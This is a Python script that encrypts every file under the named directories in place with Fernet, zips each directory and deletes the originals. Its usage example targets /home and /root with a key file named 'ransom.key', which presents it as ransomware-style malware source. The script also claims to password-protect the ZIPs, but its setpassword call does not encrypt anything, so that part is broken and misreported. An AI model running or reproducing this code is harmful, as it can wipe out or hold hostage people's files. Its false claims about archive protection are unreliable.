#!/usr/bin/env python3
"""
encryption.py
Encrypts all files in the given directories using Fernet,
then creates a password-protected ZIP of each directory,
and finally deletes the original files (leaving only the .zip).

Usage:
    python3 encryption.py <dir1> [<dir2> ...] <keyfile>

Example:
    python3 encryption.py /home /root /tmp/ransom.key
"""

import os
import sys
import getpass
import shutil
from pathlib import Path
from cryptography.fernet import Fernet
import zipfile
from zipfile import ZipFile, ZIP_DEFLATED


def generate_key(key_path: Path) -> bytes:
    key = Fernet.generate_key()
    key_path.write_bytes(key)
    print(f"[+] New encryption key written to: {key_path}")
    return key


def load_key(key_path: Path) -> bytes:
    return key_path.read_bytes()


def encrypt_file(file_path: Path, fernet: Fernet) -> None:
    try:
        data = file_path.read_bytes()
        encrypted = fernet.encrypt(data)
        file_path.write_bytes(encrypted)
        print(f"[+] Encrypted: {file_path}")
    except Exception as e:
        print(f"[-] Failed to encrypt {file_path}: {e}", file=sys.stderr)


def encrypt_directory(root_dir: Path, fernet: Fernet) -> None:
    for dirpath, _, filenames in os.walk(root_dir):
        for name in filenames:
            file_path = Path(dirpath) / name
            if file_path.is_file():
                encrypt_file(file_path, fernet)


def create_password_protected_zip(dir_path: Path, password: str) -> Path:
    """Create a password-protected ZIP of the directory."""
    zip_path = dir_path.with_suffix(".zip")
    print(f"[*] Creating password-protected ZIP: {zip_path}")

    with ZipFile(zip_path, 'w', ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = Path(root) / file
                arcname = file_path.relative_to(dir_path.parent)
                zipf.write(file_path, arcname)
        # Set password
        zipf.setpassword(password.encode())

    print(f"[+] ZIP created: {zip_path}")
    return zip_path


def delete_directory_contents(dir_path: Path) -> None:
    """Delete all files and subdirectories inside dir_path (but keep the dir)."""
    for item in dir_path.iterdir():
        try:
            if item.is_dir():
                shutil.rmtree(item)
            else:
                item.unlink()
            print(f"[-] Deleted: {item}")
        except Exception as e:
            print(f"[-] Failed to delete {item}: {e}", file=sys.stderr)


def main() -> None:
    if len(sys.argv) < 3:
        print(__doc__.strip())
        sys.exit(1)

    key_path = Path(sys.argv[-1])
    directories = [Path(p).resolve() for p in sys.argv[1:-1]]

    # Validate directories
    for d in directories:
        if not d.is_dir():
            print(f"[-] Not a directory: {d}", file=sys.stderr)
            sys.exit(1)

    # Load or generate key
    if key_path.exists():
        key = load_key(key_path)
        print(f"[+] Loaded key from: {key_path}")
    else:
        key = generate_key(key_path)

    fernet = Fernet(key)

    # Get password for ZIP (hidden input)
    print("\n[*] Enter password for the ZIP archive:")
    password = getpass.getpass(prompt="Password: ")
    confirm = getpass.getpass(prompt="Confirm: ")
    if password != confirm:
        print("[-] Passwords do not match!", file=sys.stderr)
        sys.exit(1)
    if not password:
        print("[-] Password cannot be empty!", file=sys.stderr)
        sys.exit(1)

    print("\n[*] Starting encryption...")
    for d in directories:
        print(f"\n[*] Processing directory: {d}")
        encrypt_directory(d, fernet)

    print("\n[*] Creating password-protected ZIPs and cleaning up...")
    for d in directories:
        zip_path = create_password_protected_zip(d, password)
        delete_directory_contents(d)
        print(f"[*] Directory {d} is now empty. Only ZIP remains: {zip_path.name}")

    print("\n[+] All operations completed successfully.")
    print(f"[*] Decrypt later using: python3 decryption.py {' '.join(map(str, directories))} {key_path}")
    print(f"[*] Extract ZIP with password to restore structure.")


if __name__ == "__main__":
    main()